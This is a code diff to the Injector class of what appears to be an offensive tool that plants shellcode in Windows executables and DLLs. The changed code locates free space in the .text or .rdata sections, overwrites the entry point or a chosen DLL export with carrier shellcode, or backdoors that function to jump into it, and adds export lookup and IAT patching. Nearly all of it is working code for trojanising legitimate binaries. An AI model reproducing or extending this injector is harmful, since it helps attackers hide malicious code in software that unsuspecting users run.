@@ -59,7 +59,7 @@ class Injector():
     # │         │         │       │  │        │         │       │
     # └─────────┴─────────┴───────┘  └────────┴─────────┴───────┘
 
-    # Backdoor
+    # Backdoor: .rdata random
     def get_random_data_payload_rva(self) -> int:
         complete_size = len(self.payload.payload_data)
         largest_gap = self.rdata_manager.find_holes(complete_size)
@@ -78,7 +78,7 @@ class Injector():
         return payload_rva
     
 
-    # Backdoor
+    # Backdoor: .text random
     def get_random_code_carrier_rva(self) -> int:
         complete_size = len(self.carrier_shc)
         largest_gap = self.code_manager.find_holes(complete_size)
@@ -91,7 +91,7 @@ class Injector():
         return carrier_rva
         
 
-    # Backdoor
+    # Backdoor: .text random
     def get_random_carrier_and_payload_rva_in_code(self) -> Tuple[int, int]:
         complete_size = len(self.carrier_shc) + 4096 + len(self.payload.payload_data)
         largest_gap = self.code_manager.find_holes(complete_size)
@@ -111,27 +111,10 @@ class Injector():
             payload_rva = carrier_rva + len(self.carrier_shc) + 4096
 
         return payload_rva, carrier_rva
-    
-
-    # Overwrite
-    def get_func_carrier_and_payload_rva_in_code(self) -> Tuple[int, int]:
-        func_addr = self.superpe.get_entrypoint()
-
-        carrier_rva = func_addr
-        payload_rva = carrier_rva + len(self.carrier_shc)
-
-        return payload_rva, carrier_rva
-    
-
-    # Overwrite
-    def get_func_code_carrier_rva(self) -> int:
-        func_addr = self.superpe.get_entrypoint()
-        carrier_rva = func_addr
-        return carrier_rva
         
 
     ## Inject
-    
+
     def inject_exe(self):
         exe_in = self.settings.get_inject_exe_in()
         exe_out = self.settings.get_inject_exe_out()
@@ -149,16 +132,34 @@ class Injector():
         if self.settings.carrier_invoke_style == CarrierInvokeStyle.OverwriteFunc:
             if self.settings.payload_location == PayloadLocation.CODE:
                 # Carrier and Payload both in .text section in a function
-                self.payload_rva, self.carrier_rva = self.get_func_carrier_and_payload_rva_in_code()
+                func_addr: int|None = None
+                if self.settings.dllfunc != "" and self.injectable.superpe.is_dll():
+                    func_addr = self.superpe.get_export_vaddr_by_name(self.settings.dllfunc)
+                else:
+                    func_addr = self.superpe.get_entrypoint()
+                self.carrier_rva = func_addr
+
+                # payload is behind the carrier shellcode
+                self.payload_rva = self.carrier_rva + len(self.carrier_shc)
+                    
             elif self.settings.payload_location == PayloadLocation.DATA:
                 # Carrier in a function, Payload random in data section
-                self.carrier_rva = self.get_func_code_carrier_rva() ### BUGBUGBUG
+                func_addr: int|None = None
+                if self.settings.dllfunc != "" and self.injectable.superpe.is_dll():
+                    func_addr = self.superpe.get_export_vaddr_by_name(self.settings.dllfunc)
+                else:
+                    func_addr = self.superpe.get_entrypoint()
+
+                self.carrier_rva = func_addr
+
+                # payload is somewhere in .rdata section
                 self.payload_rva = self.get_random_data_payload_rva()
 
             # copy carrier shellcode into the code section (at func)
             carrier_offset = self.superpe.get_offset_from_rva(self.carrier_rva)
             self.superpe.pe.set_bytes_at_offset(carrier_offset, self.carrier_shc)
-            logger.info("    Inject: Write Carrier to 0x{:X} (0x{:X})".format(
+            logger.info("    Inject: OverWrite {} with Carrierat 0x{:X} (0x{:X})".format(
+                self.settings.dllfunc if self.settings.dllfunc else "DllMain",
                 self.carrier_rva, carrier_offset))
 
         elif self.settings.carrier_invoke_style == CarrierInvokeStyle.BackdoorFunc:
@@ -181,12 +182,11 @@ class Injector():
             if self.settings.dllfunc == "":
                 backdoor_func_addr = self.superpe.get_entrypoint()
             else:
-                pass
-            logger.info("    Backdoor function {} (0x{:X})".format(
-                self.settings.dllfunc, backdoor_func_addr))
+                backdoor_func_addr = self.superpe.get_export_vaddr_by_name(self.settings.dllfunc)
+            logger.info("    Backdoor function: {} (0x{:X})".format(
+                self.settings.dllfunc if self.settings.dllfunc else "DllMain", backdoor_func_addr))
             self.function_backdoorer.backdoor_function(
                 backdoor_func_addr, self.carrier_rva, carrier_shc_len)
-        
 
         # Make the injected carrier work, integrate it into the PE
         self.injectable_write_iat_references()
